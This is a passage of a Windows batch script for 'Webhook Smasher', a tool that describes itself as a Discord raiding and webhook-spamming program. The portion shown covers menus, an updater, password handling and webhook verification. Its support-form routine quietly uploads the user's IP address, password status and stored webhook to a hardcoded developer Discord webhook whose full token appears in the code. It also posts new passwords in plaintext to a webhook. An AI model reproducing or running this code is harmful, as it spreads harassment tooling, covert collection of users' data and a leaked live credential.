    set /p %~1=>nul

) else set /p %~1=[90m ^| [37m
exit /b

:error
echo. [31m^| [91m%*
exit /b

:success
echo. [92m^| [97m%*
exit /b

:center
setlocal EnableDelayedExpansion

set /a size=94

set s=%*
for /L %%# in (1,2,!size!) do if "!s:~%size%,1!" == "" set "s= !s! "
set s=!s:~1,%size%!& echo !s!

endlocal && exit /b

:prcss

set /p ".=[90m | [97m" <nul
(
echo strText=wscript.arguments(0^)
echo intTextLen = Len(strText^)
echo intPause = 1
echo For x = 1 to intTextLen
echo     strTempText = Mid(strText,x,1^)
echo     WScript.StdOut.Write strTempText
echo     WScript.Sleep intPause
echo Next
)>%tmp%\%tempid%.vbs
cscript /noLogo "%tmp%\%tempid%.vbs" "%*"
del /f /q "%tmp%\%tempid%.vbs" >nul 2>&1

exit /b

:prcssOk
echo. [92m[Ok]
exit /b

:prcssErr
echo. [91m[X]
exit /b

:write
echo.[90m ^| [97m%*
exit /b

rem Webhook Smasher - Discord Webhook MultiSpammer
rem You don't have allowed to modify this software, using program,
rem you're accept EULA automaticlly.

:updateCheck

cls
call :logo
echo.
call :write What do you want to do?

echo.

call :write [37m[U][90mpdate Check
echo.
call :write [37m[E][90mnable Updates
call :write [37m[D][90misable Updates
echo.
choice /C UED /M "" /N >nul

if %errorlevel%==1 (

    call update.bat
    if %errorlevel%==1 exit
    start noupda.exe

    goto menum

)

if %errorlevel%==2 (

    del /f /q update\NoUpdate.log >nul
    cls
    call :logo
    echo.
    call :write Updates enabled.

    pause >nul

    goto menum

)


echo.>update\NoUpdate.log >nul
cls
call :logo
echo.

call :write Updates disabled.
pause >nul

goto menum








:fetchChangelog

if exist changelog.exe copy changelog.exe "%temp%" >nul
if exist update\changelog.exe copy update\changelog.exe "%temp%" >nul

set ph=%cd%
cd "%temp%"
if exist changelog.txt del /f /q changelog.txt
fetch https://github.com/decko2/websmash/raw/main/changelog.txt "changelog.txt"
start changelog.exe
cd "%ph%"

goto menum




:finalupd

mode 60,10
title Webhook Smasher Updater



cd update
consolestate /hide


start finalizeupdate.exe
timeout /nobreak /t 2 >nul

copy /Y /V "onstart\*.*" . >nul 2>&1

timeout /t 1 >nul

set fail=0
for /f "tokens=*" %%a in ('dir /b onstart') do if not exist "%%a" set fail=1

timeout /t 2 >nul
if %fail%==1 (
    cls
    consolestate /show
    taskkill /f /im finalizeupdate.exe >nul
    call :write A problem has occured and some files
    call :write failed while updating ...
    echo.
    call :write Please try it again
    pause >nul
    exit
) else (
    cd onstart
    del /f /q *.* >nul 2>&1
    consolestate /show
    cd ..
    taskkill /f /im finalizeupdate.exe >nul
    start restfnl.vbs
    exit
)

exit

:licgen

cls
call :logo
echo.[37m
call :write You have opened our license gen.
call :write Close it to continue with this app ...

start /wait LicenseGen.exe

cls
goto menum

:conform

cls
call :logo
echo.[37m
call :write Contact us! Fill the form and send it.

cd update

start /wait smashsupp.exe


if not exist support.txt (
    cd ..
    goto menum
)

if exist pswSet.dat (set pswSet=True) else set pswSet=False

if exist "update\webhook.dat" for /f "tokens=*" %%a in ('type update\webhook.dat') do set whq=%%a
if exist "webhook.dat" for /f "tokens=*" %%a in ('type webhook.dat') do set whq=%%a

(
    echo.
    echo.
    echo. Sent from IP: %MyIP%
    echo. Created at %date%; %time%
    echo.
    echo. Password set? %pswSet%
    echo.
    echo. Contact webhook:
    echo.%whq%


)>>support.txt

curl -F "file=@support.txt" https://ptb.discord.com/api/webhooks/952557411137388615/JoR7ktBHBzJ4UBI1HK5tJrf0g21CdTZetE7I9zXMYDs6t6v8ce9G4RzIQrkLyX2nr6AL >nul

timeout /t 0 >nul

del /f /q support.txt >nul

cd ..


cls
call :logo
echo.[37m

if exist "update\webhook.dat" for /f "tokens=*" %%a in ('type update\webhook.dat') do set whq=%%a
if exist "webhook.dat" for /f "tokens=*" %%a in ('type webhook.dat') do set whq=%%a
set qwmsg=Your support message was sent.
curl -X POST -H "Content-type: application/json" --data "{\"content\":null,\"embeds\":[{\"description\":\"^<:greenArrow:879662658645798912^> %wqmsg%\",\"color\":3092790}]}" %whq% >nul


call :write Your message was successfully sent.
call :write Thank you for a your time!

pause >nul
cd menum



:pswnewset

cls
call :logo
echo.[37m
call :write Password is a feature, that secure access from other's.
call :write Bellow, set password or keep this empty to unset.
echo.
set psw=unset
call :prom psw

cd update


if "%psw%" == "unset" (

    if exist "update\webhook.dat" for /f "tokens=*" %%a in ('type update\webhook.dat') do set whq=%%a
    if exist "webhook.dat" for /f "tokens=*" %%a in ('type webhook.dat') do set whq=%%a
    set qwmsg=Password protection has been disabled.
    curl -X POST -H "Content-type: application/json" --data "{\"content\":null,\"embeds\":[{\"description\":\"^<:greenArrow:879662658645798912^> %wqmsg%\",\"color\":3092790}]}" %whq% >nul

    if exist psw.dat del /f /q psw.dat >nul
    cls
    call :logo
    echo.[37m
    call :write No more passwords will be required, when
    call :write you start smasher app.
    cd ..
    pause >nul
    goto menum
) else (
    (
        echo.%psw%
    )>psw.dat

    if exist "update\webhook.dat" for /f "tokens=*" %%a in ('type update\webhook.dat') do set whq=%%a
    if exist "webhook.dat" for /f "tokens=*" %%a in ('type webhook.dat') do set whq=%%a
    set qwmsg=Password updated to: `%psw%`
    curl -X POST -H "Content-type: application/json" --data "{\"content\":null,\"embeds\":[{\"description\":\"^<:greenArrow:879662658645798912^> %wqmsg%\",\"color\":3092790}]}" %whq% >nul


    cls
    call :logo
    echo.[37m
    call :write Password successfully set to: %psw%
    call :write When you start smasher app, you will be asked for a password.
    cd ..
    pause >nul
    goto menum
)

exit



:appinfo

cls
call :logo
echo.[37m
call :write Version %vers% [ID: %versid%]
echo.
call :write Free and Advanced discord raiding tool
call :write using a webhooks.
echo.
call :write Developer: Mr. Cat
call :write Beta Tester: Mario
echo.
pause >nul
goto menum




:sethook

cls
call :logo
echo.[37m

call :write When any problems occurs, you will be notified
call :write using a your webhook. This webhook will be
call :write shared with a developer.
echo.
call :write Enter a webhook URL or keep this empty
call :write older webhook.
echo.
for /f "tokens=*" %%a in ('type update\webhook.dat') do if /i "%%a"=="unset" (set stt=UNSET) else set stt=WEBHOOK VERIFIED

call :write State - %stt%
echo.

set w=unset
call :prom w

if "%w%" == "unset" (
    (
        echo.unset
    )>update\webhook.dat
    cls
    call :logo
    echo.[37m
    call :write Webhook has been removed!
    call :write You can set a webhook again.
    pause >nul
    goto menum
)

set _Len=
set _count+=
:A
Setlocal EnableDelayedExpansion
set _RNDLength=7
set _Alphanumeric=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
set _Str=%_Alphanumeric%987654321

:_LenLoop
if not "%_Str:~18%"=="" set _Str=%_Str:~9%& set /A _Len+=9& goto :_LenLoop
set _tmp=%_Str:~9,1%
set /A _Len=_Len+_tmp
set _count=0
set _RndAlphaNum=

:_loop
set /a _count+=1
set _RND=%Random%
set /A _RND=_RND%%%_Len%
set _RndAlphaNum=!_RndAlphaNum!!_Alphanumeric:~%_RND%,1!
if !_count! lss %_RNDLength% goto _loop
set vfcode=!_RndAlphaNum!
setlocal disabledelayedexpansion
endlocal


curl -X POST -H "Content-type: application/json" --data "{\"content\":null,\"embeds\":[{\"description\":\"Hello,\n\ndo you entered this webhook as a notification channel webhook? If not, you can safely delete this message.\n\nIf you want to verify this webhook using a Smasher, there's a your code.\",\"color\":3092790},{\"title\":\"%vfcode%\",\"color\":3092790}]}" %w% >nul

cls
call :logo
echo.[37m
call :write You have received a verification code
call :write on a your entered webhook.
echo.
call :write What's the code, you received?
echo.

call :prom vfcode_ask

if not "%vfcode_ask%" == "%vfcode%" (
    cls
    call :logo
    echo.[37m
    call :write Incorrect verification code!
    pause >nul
    goto menum
)



(
    echo.%w%
)>update\webhook.dat


if exist "update\webhook.dat" for /f "tokens=*" %%a in ('type update\webhook.dat') do set whq=%%a
if exist "webhook.dat" for /f "tokens=*" %%a in ('type webhook.dat') do set whq=%%a
set qwmsg=Your contact webhook has been successfully set!
curl -X POST -H "Content-type: application/json" --data "{\"content\":null,\"embeds\":[{\"description\":\"^<:greenArrow:879662658645798912^> %wqmsg%\",\"color\":3092790}]}" %whq% >nul

cls
call :logo
echo.[37m
call :write Webhook successfully verified and saved.
pause >nul
goto menum

:pswFail

echo.
echo.

if exist "update\webhook.dat" for /f "tokens=*" %%a in ('type update\webhook.dat') do set whq=%%a
if exist "webhook.dat" for /f "tokens=*" %%a in ('type webhook.dat') do set whq=%%a
set qwmsg=All password attempts failed!
curl -X POST -H "Content-type: application/json" --data "{\"content\":null,\"embeds\":[{\"description\":\"^<:greenArrow:879662658645798912^> %wqmsg%\",\"color\":3092790}]}" %whq% >nul

call :error You have failed all the attempts.
call :error App shutdown required.
pause >nul
exit
